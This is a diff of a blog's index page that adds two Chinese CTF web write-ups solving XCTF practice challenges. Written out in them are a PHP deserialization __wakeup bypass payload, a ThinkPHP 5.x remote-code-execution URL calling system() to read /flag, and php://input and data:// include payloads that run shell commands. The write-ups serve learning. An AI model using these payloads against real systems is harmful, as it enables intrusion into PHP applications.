@@ -175,7 +175,7 @@
             
 
   
-    <article id="post-12. redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ctf/ctf笔记-02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -183,7 +183,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/12.%20redis/" target="_blank">12.Redis</a>
+	  <a class="article-title" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-02/" target="_blank">CTF笔记-WEB攻防-02</a>
   
     </h1>
   
@@ -191,7 +191,307 @@
 
   
   
-<a href="/2020/09/29/12.%20redis/" class="archive-article-date">
+<a href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-02/" class="archive-article-date">
+        <time datetime="2020-10-01T13:25:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-01</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>[toc]</p>
+<h1 id="CTF笔记-WEB攻防-02"><a href="#CTF笔记-WEB攻防-02" class="headerlink" title="CTF笔记-WEB攻防-02"></a>CTF笔记-WEB攻防-02</h1><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">Web_php_unserialize</a></h2><p>(题外话)<del>这一题觉得好难呀</del></p>
+<p>访问端口:</p>
+<p><strong>output:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>var</strong></p>
+<ol>
+<li>我们需要get传参var，var的值就是序列化后的类的base64编码</li>
+<li>在处理var时用到了正则匹配检测，含义就是匹配 <code>o或c之后跟数字加冒号的格式</code></li>
+</ol>
+<p><strong>Demo</strong></p>
+<ol>
+<li>看到了三个方法，构造器不用管，从注释看到了目标文件fl4g.php</li>
+<li>__destruct会将输入的文件输出</li>
+<li><em>\</em>wakeup则是一个防护用函数，将file强制改为index.php，因此我们需要绕过__wakeup方法</li>
+</ol>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br><span class="line">=&gt;绕过正则 O:+<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br><span class="line">=&gt;绕过__wakeup() O:+<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &apos;index.php&apos;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &apos;index.php&apos;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file = &apos;index.php&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$b = new Demo(&apos;fl4g.php&apos;);</span><br><span class="line">$c = serialize($b);</span><br><span class="line">$c = str_replace(&quot;O:4&quot;, &quot;O:+4&quot;, $c);</span><br><span class="line">$c = str_replace(&quot;:1:&#123;&quot;, &quot;:2:&#123;&quot;, $c);</span><br><span class="line">echo base64_encode($c);</span><br></pre></td></tr></table></figure>
+
+<p><strong>output</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
+
+<p><strong>url</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:36436/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
+
+<h3 id="反思踩坑-gt-base64"><a href="#反思踩坑-gt-base64" class="headerlink" title="反思踩坑=&gt;base64"></a>反思踩坑=&gt;base64</h3><p>我们如果使用网页上的base64加密工具，则会出现忽略空格的问题:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64加密工具：TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</span><br><span class="line">php自行加密：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在使用base64加密时，一定要构造原生php，切记使用加密工具!</p>
+</blockquote>
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a><a href="https://blog.csdn.net/qq_43814486/article/details/90020139" target="_blank" rel="noopener">rce</a></h3><p>访问端口，得到了tp的默认首页</p>
+<p>这里需要使用tp的 5.0-5.0.24 版本和 5.1.0-5.1.30 版本的rce漏洞进行攻击</p>
+<p><a href="https://www.cnblogs.com/nongchaoer/p/12029478.html" target="_blank" rel="noopener">攻击方法</a> =&gt; <code>这篇博客写的有点问题，我们需要将thinkapp换为think\app</code></p>
+<h3 id="url"><a href="#url" class="headerlink" title="url"></a>url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:58615/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在输出发现/flag文件，访问它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:58615/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
+<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>访问端口，得到了php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><del>这题解法很多样的样子，看看wp能得到很多操作</del></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="php"><a href="#php" class="headerlink" title="php://"></a><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a></h4><p>这里php://不分大小写，代码中只做了小写判定，所以我们可以<strong>大小写绕过</strong></p>
+<h4 id="burp拦截头信息"><a href="#burp拦截头信息" class="headerlink" title="burp拦截头信息"></a>burp拦截头信息</h4><p> – proxy – interccept =&gt;(获取到头信息后) Actions – send to repeater</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改头信息"><a href="#修改头信息" class="headerlink" title="修改头信息"></a>修改头信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Php://input HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>output</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fl4gisisish3r3.php</span><br><span class="line">index.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<p>访问fl4gisisish3r3.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Php://input HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
+<h3 id="使用其他协议"><a href="#使用其他协议" class="headerlink" title="使用其他协议"></a>使用其他协议</h3><h4 id="data"><a href="#data" class="headerlink" title="data://"></a><a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a></h4><h4 id="修改头信息-拦截见上"><a href="#修改头信息-拦截见上" class="headerlink" title="修改头信息(拦截见上)"></a>修改头信息(拦截见上)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,%0CPD9waHAgc3lzdGVtKCdscycpOyA/Pg== </span><br><span class="line"># &lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8+</span><br><span class="line"># &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时候出问题了</p>
+<h4 id="url中的特殊符号"><a href="#url中的特殊符号" class="headerlink" title="url中的特殊符号"></a>url中的特殊符号</h4><p>我们需对url中的特殊符号(+, (空格), )进行<a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener">url编码</a>来传数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8%2b</span><br><span class="line"># &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在html注释get到了flag</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-02/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctf/ctf笔记-01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-01/" target="_blank">CTF笔记-WEB攻防-01</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-01/" class="archive-article-date">
+        <time datetime="2020-10-01T13:25:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-01</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>[toc]</p>
+<h1 id="CTF笔记-WEB攻防-01"><a href="#CTF笔记-WEB攻防-01" class="headerlink" title="CTF笔记-WEB攻防-01"></a>CTF笔记-WEB攻防-01</h1><blockquote>
+<p>写在前面：</p>
+<ol>
+<li>此笔记系个人(初学者)整理思路之用，没有想过能起到供各位参考学习的用处。</li>
+<li>尽可能按照<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>的题目顺序来。</li>
+<li>如果各位从我的文章发现了什么问题或者想和我探<del>tan</del>讨<del>tan</del>探<del>ren</del>讨<del>sheng</del>，欢迎联系我呀~</li>
+</ol>
+</blockquote>
+<hr>
+<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411&page=1" target="_blank" rel="noopener">baby_web</a></h2><p>​    进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch</p>
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://220.249.52.133:40885 -e*</span><br></pre></td></tr></table></figure>
+
+<p><strong>output:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[19:22:07] 403 -  306B  - /.htaccess.bak1</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.orig</span><br><span class="line">[19:22:07] 403 -  308B  - /.htaccess.sample</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.save</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessBAK</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessOLD</span><br><span class="line">[19:22:07] 403 -  305B  - /.htaccessOLD2</span><br><span class="line">[19:22:07] 403 -  303B  - /.httr-oauth</span><br><span class="line">[19:22:15] 200 -   11B  - /1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php  -&gt;  1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php/login/  -&gt;  1.php</span><br><span class="line">[19:23:30] 403 -  305B  - /server-status</span><br><span class="line">[19:23:30] 403 -  306B  - /</span><br></pre></td></tr></table></figure>
+
+<p>发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题</p>
+<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>​    看题目知道，是关于<a href="https://www.cnblogs.com/benpao1314/p/11352276.html" target="_blank" rel="noopener">robots.txt</a>的,因此我们可以直接访问robots.txt路由/robots.txt</p>
+<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>​    <strong>output:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
+
+<p>看到了类似于flag的路由，过去直接发现路由</p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>​    根据题目来看，这题是关于反序列化的</p>
+<p>​    访问地址：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>​     <del>发现这php语法错误，少一括号</del>看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag</p>
+<p>​    我们把这个类序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> xctf();</span><br><span class="line">$c = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>
+
+<p><strong>output</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们直接写入code参数中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>output</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bad requests</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。</p>
+<h3 id="如何绕过php反序列化的-wakeup-方法呢？"><a href="#如何绕过php反序列化的-wakeup-方法呢？" class="headerlink" title="如何绕过php反序列化的__wakeup()方法呢？"></a>如何绕过php反序列化的__wakeup()方法呢？</h3><blockquote>
+<p>在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法</p>
+</blockquote>
+<blockquote>
+<p>例如，<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>,我们若改成：<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法</p>
+</blockquote>
+<p>重新路由：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到了flag</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-01/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-nodeJs/12. redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/09/29/nodeJs/12.%20redis/" target="_blank">12.Redis</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/09/29/nodeJs/12.%20redis/" class="archive-article-date">
         <time datetime="2020-09-29T11:21:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -215,7 +515,7 @@
 <p>具有多语言支持</p>
 </blockquote>
     
-    <a class="article-more-a" href="/2020/09/29/12.%20redis/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/12.%20redis/#more">more >></a>
     
     
 
@@ -246,7 +546,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/12.%20redis/">展开全文 >></a>
